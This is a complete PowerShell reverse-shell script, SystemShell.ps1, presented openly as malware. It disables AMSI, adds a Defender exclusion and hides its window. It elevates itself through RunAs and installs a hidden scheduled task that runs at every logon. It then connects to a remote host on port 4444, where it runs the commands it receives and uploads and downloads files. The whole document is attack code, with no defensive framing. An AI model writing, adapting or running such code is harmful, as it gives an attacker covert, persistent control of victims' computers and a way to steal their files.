<#
    SystemShell.ps1
    Hidden, self-elevating, persistent PowerShell reverse shell.

    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File SystemShell.ps1
    powershell -File SystemShell.ps1 -Server 1.2.3.4 -Port 4444

    Shell commands:  exit | quit | download <path> | upload <path> <base64>
#>
[CmdletBinding()]
param(
    [string]$Server    = '172.16.31.140',
    [int]   $Port      = 4444,
    [switch]$NoPersist,
    [switch]$Visible
)

#region globals
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
$WarningPreference     = 'SilentlyContinue'

$Root       = Join-Path $env:ProgramData 'SystemShell'
$ScriptPath = Join-Path $Root 'SystemShell.ps1'
$VbsPath    = Join-Path $Root 'run.vbs'
$LogFile    = Join-Path $Root 'SystemShell.log'
$TaskName   = 'SystemShell'

function Write-Log([string]$m) {
    try {
        if (-not (Test-Path $Root)) { New-Item -ItemType Directory -Path $Root -Force | Out-Null }
        Add-Content -LiteralPath $LogFile -Value ('[{0}] {1}' -f (Get-Date -f 'yyyy-MM-dd HH:mm:ss'), $m)
    } catch {}
}

function Test-Admin {
    try {
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole(
            [Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { $false }
}

function Get-Self {
    if ($PSCommandPath)               { return $PSCommandPath }
    if ($MyInvocation.MyCommand.Path) { return $MyInvocation.MyCommand.Path }
    return $null
}
#endregion

#region bypasses
function Invoke-Bypasses {
    foreach ($scope in 'Process','CurrentUser','LocalMachine') {
        try { Set-ExecutionPolicy -Scope $scope -ExecutionPolicy Bypass -Force } catch {}
    }
    try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($a) { $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
    } catch {}
    try { if (Test-Path $Root) { Add-MpPreference -ExclusionPath $Root } } catch {}
}

function Hide-Console {
    if ($Visible) { return }
    try {
        if (-not ('Win32.Native' -as [type])) {
            Add-Type -Namespace Win32 -Name Native -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]   public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
        }
        $h = [Win32.Native]::GetConsoleWindow()
        if ($h -ne [IntPtr]::Zero) { [void][Win32.Native]::ShowWindow($h, 0) }
    } catch {}
}
#endregion

#region persistence
function Install-Persistence {
    try {
        if (-not (Test-Path $Root)) { New-Item -ItemType Directory -Path $Root -Force | Out-Null }

        $self = Get-Self
        if ($self -and ($self -ne $ScriptPath)) {
            Copy-Item -LiteralPath $self -Destination $ScriptPath -Force
            Unblock-File -LiteralPath $ScriptPath
        }

        $vbs = @"
Set sh = CreateObject("WScript.Shell")
sh.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$ScriptPath""", 0, False
"@
        Set-Content -LiteralPath $VbsPath -Value $vbs -Encoding ASCII -Force

        try {
            $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument ('"{0}"' -f $VbsPath)
            $trig   = New-ScheduledTaskTrigger -AtLogOn
            $prin   = New-ScheduledTaskPrincipal -UserId ("{0}\{1}" -f $env:USERDOMAIN,$env:USERNAME) `
                                                 -LogonType Interactive -RunLevel Highest
            $set    = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
                                                   -StartWhenAvailable -Hidden -MultipleInstances IgnoreNew `
                                                   -ExecutionTimeLimit ([TimeSpan]::Zero)
            Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trig `
                                   -Principal $prin -Settings $set -Force | Out-Null
            Write-Log 'scheduled task registered'
        } catch {
            Write-Log ('ScheduledTasks failed, falling back to schtasks: ' + $_.Exception.Message)
            & schtasks.exe /Create /TN $TaskName /TR ('wscript.exe "{0}"' -f $VbsPath) `
                           /SC ONLOGON /RL HIGHEST /F | Out-Null
        }
    } catch { Write-Log ('persistence failed: ' + $_.Exception.Message) }
}
#endregion

#region shell
function Start-Shell {
    $enc = New-Object System.Text.UTF8Encoding($false)

    while ($true) {
        $client = $null; $reader = $null; $writer = $null
        try {
            $client = New-Object System.Net.Sockets.TcpClient
            $iar    = $client.BeginConnect($Server, $Port, $null, $null)
            if (-not $iar.AsyncWaitHandle.WaitOne(5000, $false)) { throw 'connect timeout' }
            $client.EndConnect($iar)

            $stream = $client.GetStream()
            $reader = New-Object System.IO.StreamReader($stream, $enc)
            $writer = New-Object System.IO.StreamWriter($stream, $enc)
            $writer.AutoFlush = $true

            $writer.WriteLine('')
            $writer.WriteLine('=== {0} :: {1} :: admin={2} :: PS {3} ===' -f `
                $env:COMPUTERNAME, $env:USERNAME, (Test-Admin), $PSVersionTable.PSVersion)

            while ($client.Connected) {
                $writer.Write('{0}@{1} {2}> ' -f $env:USERNAME, $env:COMPUTERNAME, (Get-Location).Path)

                $line = $reader.ReadLine()
                if ($null -eq $line) { break }
                $cmd = $line.Trim()
                if ($cmd -eq '') { continue }
                if ($cmd -eq 'exit' -or $cmd -eq 'quit') { $writer.WriteLine('bye'); return }

                if ($cmd -match '^(?i)download\s+(.+)$') {
                    $p = $Matches[1].Trim().Trim('"').Trim("'")
                    if (Test-Path -LiteralPath $p) {
                        try {
                            $full = (Resolve-Path -LiteralPath $p).Path
                            $writer.WriteLine('[DOWNLOAD] ' + [Convert]::ToBase64String([IO.File]::ReadAllBytes($full)))
                        } catch { $writer.WriteLine('download: ' + $_.Exception.Message) }
                    } else { $writer.WriteLine('download: no such file') }
                    continue
                }

                if ($cmd -match '^(?i)upload\s+(\S+)\s+([A-Za-z0-9+/=\s]+)$') {
                    try {
                        $bytes = [Convert]::FromBase64String(($Matches[2] -replace '\s',''))
                        [IO.File]::WriteAllBytes($Matches[1].Trim('"'), $bytes)
                        $writer.WriteLine('upload: ok')
                    } catch { $writer.WriteLine('upload: ' + $_.Exception.Message) }
                    continue
                }

                try {
                    $out = Invoke-Expression -Command $cmd 2>&1 | Out-String
                    if ($out) { $writer.Write($out) }
                    if ($out -and -not $out.EndsWith("`n")) { $writer.WriteLine('') }
                } catch { $writer.WriteLine('error: ' + $_.Exception.Message) }
            }
        } catch {
            Start-Sleep -Seconds 5
        } finally {
            try { $writer.Close() } catch {}
            try { $reader.Close() } catch {}
            try { $client.Close() }  catch {}
        }
    }
}
#endregion

#region main
Invoke-Bypasses
Hide-Console

if (-not (Test-Admin)) {
    Write-Log 'not elevated - relaunching via RunAs'
    $self = Get-Self
    if ($self) {
        Start-Process powershell.exe -Verb RunAs -ArgumentList @(
            '-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-File', $self
        )
    }
    exit
}

if (-not $NoPersist) { Install-Persistence }
Start-Shell
#endregion
